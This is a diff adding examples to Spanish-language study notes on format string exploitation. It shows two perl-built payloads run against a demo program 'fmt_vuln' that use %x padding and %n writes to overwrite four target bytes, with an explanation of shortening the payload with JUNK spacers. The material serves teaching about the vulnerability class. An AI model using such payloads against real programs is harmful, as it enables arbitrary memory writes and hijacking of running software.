@@ -221,9 +221,17 @@
    Una solucion es hacerlo en multiples escrituras, donde cada una se hace con la posicion de memoria 
    aumentada en 1 (o mas, por si usamos wrap-around), para que el ultimo byte de los 4 se conserve.
 
+*** Ejemplos
+   ~$ ./fmt_vuln $(perl -e 'print "\xd0\x98\x04\x08"."\xd1\x98\x04\x08"."\xd2\x98\x04\x08"."\xd3\x98\x04\x08"').%169x.%08x.%08x.%n.$(perl -e 'print "A"x220').%n.$(perl -e 'print "A"x89').%n.$(perl -e 'print "A"x256').%n~   
+   Tiene 613 bytes de longitud
 
-   
+   ~$ ./fmt_vuln $(perl -e 'print "\xd0\x98\x04\x08"."JUNK"."\xd1\x98\x04\x08"."JUNK"."\xd2\x98\x04\x08"."JUNK"."\xd3\x98\x04\x08"."%8x%8x%161x"."%n"."%222x"."%n"."%91x"."%n"."%258x"."%n"')~
+   Tiene 62 bytes de longitud. En lugar de aumentar los bytes escritos mediante directamente desde el format
+   string, utiliza el min-width con (%nnnx) de los "JUNK" entre cada direccion. Esto permite que el format
+   string sea chica, a pesar de imprimir una cantidad grande de caracteres.
 
-   
-     
+    
+
+    
+      
 
